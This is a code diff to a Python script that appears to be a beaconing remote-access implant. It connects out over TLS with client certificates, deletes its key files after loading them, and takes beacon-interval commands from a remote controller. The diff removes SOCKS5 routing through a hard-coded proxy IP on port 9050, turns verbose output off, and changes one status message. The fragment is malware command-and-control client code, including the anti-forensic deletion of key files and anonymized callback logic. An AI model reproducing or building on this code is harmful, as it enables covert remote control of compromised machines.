@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import socket, platform, ssl, subprocess, socks
+import socket, platform, ssl, subprocess
 from printlib import *
 from time import time, sleep
 from os import remove, path, getpid, kill
@@ -12,7 +12,7 @@ remote_port = 8081
 proxy_ip = '201.94.250.116'
 proxy_port = 9050
 server_sni_hostname = ''
-VERBOSE = True
+VERBOSE = False
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL = 10    #in seconds
 
@@ -163,10 +163,6 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
     context.check_hostname = False
     context.load_cert_chain(certfile='client_cert', keyfile='client_key')
     delete_keys()
-    #s = socks.socksocket()
-    #s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr=proxy_ip, port=proxy_port)
-    socket.socket = socks.socksocket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #s.settimeout(4)
     #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -210,7 +206,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
             elif temp.isdigit():
                 BEACON_INTERVAL = int(data.strip("[BEACON]"))
-                send_data(conn, "Beacon Setting: {}".format(BEACON_INTERVAL))
+                send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL))
             elif temp == "START":
                 if VERBOSE:
                     print_info("Received Beacon Instruction")
